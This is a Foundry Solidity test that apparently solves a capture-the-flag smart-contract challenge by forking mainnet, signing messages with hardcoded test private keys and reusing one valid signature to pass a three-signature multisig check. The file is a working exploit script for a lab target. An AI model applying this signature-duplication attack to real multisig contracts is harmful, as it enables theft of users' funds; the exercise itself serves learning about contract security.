// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

import {ERC2771Forwarder, ERC2771Context} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

interface IPermitToReenter {
    struct Sig {
        uint256 _index;
        bytes32 hashed;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function pot() external view returns (address);

    function amounts(address owner) external view returns (uint256);

    function solve() external;

    function withdraw() external payable;

    function deposit() external payable;

    function multisig(Sig[] calldata _sigs) external;
}

contract ChallengeEasy5Test is Test {
    /// address of the deployed challenge on mainnet (forked)
    IPermitToReenter constant CHALLENGE = IPermitToReenter(0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434);

    Vm.Wallet user = vm.createWallet("user"); // EOA with private key

    function setUp() public {
        // fork mainnet
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 24_908_500);
    }

    function testSolve5() public {
        Vm.Wallet memory user1 = vm.createWallet(0x614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269);
        Vm.Wallet memory user2 = vm.createWallet(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
        //we need to sign 3 multisig messages

        bytes32 digest1 = keccak256(abi.encode(user1.addr, user.addr));
        bytes32 digest2 = keccak256(abi.encode(user2.addr, user.addr));


        IPermitToReenter.Sig[] memory sigs = new IPermitToReenter.Sig[](3);

        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(user1, digest1);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(user2, digest2);
        sigs[0] = IPermitToReenter.Sig(0, digest1, v1, r1, s1);
        sigs[1] = IPermitToReenter.Sig(1, digest2, v2, r2, s2);

        // Flip to the other valid sig
        // sigs[2] = IPermitToReenter.Sig(2, digest1, v3, r3, s3);
        sigs[2] = IPermitToReenter.Sig(1, digest2, v2, r2, s2);

        // Now recover again – you’ll get exactly the same signer
        console.log(ecrecover(digest1, v1, r1, s1));
        console.log(ecrecover(digest2, v2, r2, s2));

        vm.startPrank(user.addr);
        CHALLENGE.multisig(sigs);
    }
}
